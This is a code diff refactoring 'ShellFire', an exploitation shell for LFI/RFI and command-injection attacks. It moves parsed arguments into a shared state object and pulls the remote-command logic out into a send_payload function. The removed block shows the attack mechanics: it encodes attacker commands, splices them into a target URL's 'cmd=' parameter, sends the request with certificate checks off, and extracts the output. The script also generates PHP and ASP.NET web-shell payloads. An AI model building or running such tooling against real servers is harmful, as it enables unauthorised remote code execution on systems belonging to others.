@@ -16,7 +16,7 @@ import threading
 import time
 
 from config import cfg, state
-from commands import command_list, cmd_config
+from commands import command_list, cmd_config, send_payload
 from payloads import get_aspnet_payload, get_php_payload
 from plugin_collection import plugins
 
@@ -45,19 +45,19 @@ parser = argparse.ArgumentParser(description='Exploitation shell for LFI/RFI and
 parser.add_argument('-c', dest='config', action='store', nargs='?', default=None, const='default', help='load a named config on startup.')
 parser.add_argument('-d', dest='debug', action='store_true', help='enable debugging (show queries during execution)')
 parser.add_argument('--generate', dest='payload', help='generate a payload to stdout. PAYLOAD can be "php" or "aspnet".')
-args = parser.parse_args()
+state.args = parser.parse_args()
 
 ############################################################
 ## Main App
 
 def main():
   ## if we are generating a payload to stdout, do it now, then bail
-  if args.payload:
-    args.payload = args.payload.lower()
-    if args.payload == "php":
+  if state.args.payload:
+    state.args.payload = state.args.payload.lower()
+    if state.args.payload == "php":
       sys.stderr.write("[*] Generating PHP payload...\n")
       payload_php()
-    elif args.payload == "aspnet":
+    elif state.args.payload == "aspnet":
       sys.stderr.write("[*] Generating ASP.NET payload...\n")
       payload_aspnet()
     else:
@@ -77,14 +77,14 @@ def main():
 """)
   sys.stdout.write("[*] ShellFire v" + cfg.version + "\n")
   sys.stdout.write("[*] Type '.help' to see available commands\n")
-  if args.debug == True:
+  if state.args.debug == True:
     sys.stdout.write("[*] Debug mode enabled.\n")
 
   requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
   ## if we specified to load a named config, do it now
-  if args.config:
-    cmd_config([".config", "load", args.config])
+  if state.args.config:
+    cmd_config([".config", "load", state.args.config])
 
   ## setup history
   if os.path.isfile(cfg.history_file):
@@ -125,59 +125,7 @@ def main():
         except Exception as e:
           sys.stdout.write("[!] %s\n" % (repr(e)))
 
-    ## execute our command to the remote target
-    if state.exec_cmd:
-      cmd = state.userinput
-
-      ## let's run our input through our encoding plugins
-      if len(cfg.encode_chain):
-        try:
-          for enc in cfg.encode_chain:
-            cmd = plugins.plugins[enc].run(cmd)
-        except:
-          pass
-
-      ## validate the URL format
-      if '{}' in cfg.url:
-        query = cfg.url.replace('{}', cmd.strip())
-      else:
-        if '?' in cfg.url:
-          if 'cmd=' not in cfg.url:
-            query = cfg.url + '&cmd=' + cmd
-          else:
-            query = cfg.url.replace('cmd=', 'cmd=' + cmd)
-        else:
-          query = cfg.url + cmd.strip()
-      ## log debug info
-      if args.debug:
-        sys.stdout.write("[D] " + query + "\n")
-      try:
-        if cfg.method == "post":
-          r = requests.post(query, data=cfg.post_data, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
-        else:
-          r = requests.get(query, verify=False, cookies=cfg.cookies, headers=cfg.headers, auth=cfg.auth)
-        ## sanitize the output. we only want to see our commands if possible
-        buffer = r.text.split(cfg.marker)
-        output = ""
-        if len(buffer) > 1:
-          for idx in cfg.marker_idx:
-            output = output + buffer[idx] + "\n"
-        else:
-          output = buffer[0]
-        ## strip trailing newlines
-        output = output.rstrip()
-        ## display our results
-        sys.stdout.write(output + "\n")
-        if state.userinput == '_show_phpinfo':
-          file = 'phpinfo.html'
-          fp = open(file, 'w')
-          fp.write(output)
-          fp.close()
-          sys.stdout.write("[*] Output saved to '" + file + "'.\n")
-      except Exception as e:
-        sys.stderr.write("[!] Unable to make request to target.\n")
-        sys.stderr.write("[!] %s\n" % e)
-        sys.stdout.flush()
+    send_payload()
 
 ## Main entrypoint - let's not pollute the global scope here.
 if __name__ == "__main__":
